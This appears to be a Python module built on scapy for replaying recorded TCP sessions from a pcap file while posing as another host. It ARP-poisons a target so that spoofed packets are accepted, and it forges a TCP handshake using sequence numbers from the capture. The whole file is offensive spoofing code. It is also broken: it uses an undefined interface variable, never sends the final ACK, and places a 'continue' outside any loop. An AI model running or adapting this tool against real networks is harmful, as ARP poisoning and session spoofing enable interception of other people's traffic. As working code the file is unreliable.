import time
from scapy.all import *
from .Client import Client, NetAttrs


def replay_usage(exit_num=None):
    usg = ""
    usg += "Requires: Server/Client IP, PCAP Interface"

    print(usg)


def sniffer(src, dst):
    return sniff(iface=intface, count=1, lfilter=lambda x: x.haslayer(TCP) and
                 x[IP].src == src.ip and x[IP].dst == dst.ip and
                 x[TCP].flags)[0]


# perform triple handshake with destination
def t_shake(client, src, dst, s_to_d, d_to_s):
    l0, l1, l2 = client.gen_layers(src=src, dst=dst, tcp=True)
    msg = l0 / l1 / l2

    client.add_options(msg, {
        'TCP': {
            'flags': 'S',
            'seq': s_to_d.pop(0)[TCP].seq
            }})

    sendp(msg, iface=client.intface)

    t = sniffer(src, dst)

    if 'SA' not in t.flags:
        print('ERROR: SYN-ACK not received')
        return False

    msg = l0 / l1 / l2

    client.add_options(msg, {
        'TCP': {
            'flags': 'A',
            'seq': t[TCP].ack,
            'ack': t[TCP].seq + 1
            }})

    return True


# spoof arp so that other networks recognize spoofed client
def arp_poison(client, src, dst):
    send(ARP(op=2, hwsrc=src.mac, psrc=src.ip, hwdst=dst.mac, pdst=dst.ip),
         iface=client.intface)


# filter pcap for tcp messages from client and server
def pcap_filter(pcap, src, dst):
    s_to_d = []
    d_to_s = []

    for packet in pcap:
        if packet[IP].src == src.ip and packet[IP].dst == dst.ip:
            s_to_d.append(packet)

        elif packet[IP].src == dst.ip and packet[IP].dst == src.ip:
            d_to_s.append(packet)

    return (s_to_d, d_to_s)


def tcp_replay(client, src, dst):
    pcap = input('Enter pcap or show to see options: ')
    while 'show' == pcap:
        print(client)
        pcap = input('Enter pcap or show to see options: ')

    client.update(['pcap:', pcap])
    s_to_d, d_to_s = pcap_filter(client.pcaps[pcap], src, dst)

    arp_poison(client, src, dst)
    if t_shake(client, src, dst, s_to_d, d_to_s):
        continue
